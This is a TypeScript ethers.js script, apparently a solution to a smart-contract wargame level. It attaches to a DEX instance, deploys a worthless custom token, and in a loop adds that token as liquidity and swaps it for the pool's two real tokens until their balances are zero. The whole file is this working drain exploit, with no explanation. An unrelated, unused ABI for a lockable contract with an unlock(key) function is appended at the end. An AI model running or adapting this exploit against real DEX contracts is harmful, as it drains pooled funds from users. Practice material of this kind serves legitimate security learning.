// Runtime Environment's members available in the global scope.
import { ethers } from 'ethers';
import { BigNumber, Signer, BytesLike } from "ethers";
import { getSigner } from "./signer";
import { Dex__factory, SwappableToken__factory } from "../typechain";

async function main() {
  const instanceAddress = "0xa1157dc8973a12b981e58722802EeB132E58bbcc";
  const signer = getSigner();

  const dex = await (new Dex__factory(signer)).attach(instanceAddress);
  console.log("allow dex to transfer my money");
  await (await dex.approve(dex.address, ethers.constants.MaxUint256)).wait();
  console.log("create new token");
  const newToken = await new SwappableToken__factory(signer).deploy("newToken", "NT", 100000);
  await newToken.deployed();
  await (await newToken.approve(dex.address, ethers.constants.MaxUint256)).wait();



  const playerAddress = await signer.getAddress();
  const token1 = await dex.token1();
  const token2 = await dex.token2();
  console.log("swapping");

  const playerToken1Balance = async () => await dex.balanceOf(token1, playerAddress);
  const playerToken2Balance = async () => await dex.balanceOf(token2, playerAddress);
  const playerToken3Balance = async () => await dex.balanceOf(newToken.address, playerAddress);
  const liquid1Balance = async () => await dex.balanceOf(token1, dex.address);
  const liquid2Balance = async () => await dex.balanceOf(token2, dex.address);
  const liquid3Balance = async () => await dex.balanceOf(newToken.address, dex.address);

  while (true) {

    const liquid1 = await liquid1Balance();
    const liquid2 = await liquid2Balance();
    const liquid3 = await liquid3Balance();
    const t1b = await playerToken1Balance();
    const t2b = await playerToken2Balance();
    const t3b = await playerToken3Balance();
    console.log("liquid1: ", liquid1.toString());
    console.log("liquid2: ", liquid2.toString());
    console.log("liquid3: ", liquid3.toString());
    console.log("balance of token1: ", t1b.toString());
    console.log("balance of token2: ", t2b.toString());
    console.log("balance of newToken: ", t3b.toString());
    if (liquid1.isZero() && liquid2.isZero())
      break;

    if (liquid1.gt(0)) {
      console.log("swap newToken for 1")
      console.log("add liquidity");
      await (await dex.add_liquidity(newToken.address, liquid1)).wait();
      await (await dex.swap(newToken.address, token1, liquid1, { gasLimit: 500000 })).wait();
    }
    if (liquid2.gt(0)) {
      console.log("swap newToken for 2")
      console.log("add liquidity");
      await (await dex.add_liquidity(newToken.address, liquid2)).wait();
      await (await dex.swap(newToken.address, token2, liquid2, { gasLimit: 500000 })).wait();
    }
  }

}

main()
  .then(() => {
    console.log("Done!");
    process.exit(0);
  })
  .catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });

const abi = [
  {
    "inputs": [
      {
        "internalType": "bytes32[3]",
        "name": "_data",
        "type": "bytes32[3]"
      }
    ],
    "stateMutability": "nonpayable",
    "type": "constructor"
  },
  {
    "inputs": [],
    "name": "ID",
    "outputs": [
      {
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
      }
    ],
    "stateMutability": "view",
    "type": "function",
    "constant": true,
    "signature": "0xb3cea217"
  },
  {
    "inputs": [],
    "name": "locked",
    "outputs": [
      {
        "internalType": "bool",
        "name": "",
        "type": "bool"
      }
    ],
    "stateMutability": "view",
    "type": "function",
    "constant": true,
    "signature": "0xcf309012"
  },
  {
    "inputs": [
      {
        "internalType": "bytes16",
        "name": "_key",
        "type": "bytes16"
      }
    ],
    "name": "unlock",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function",
    "signature": "0xe1afb08c"
  }
]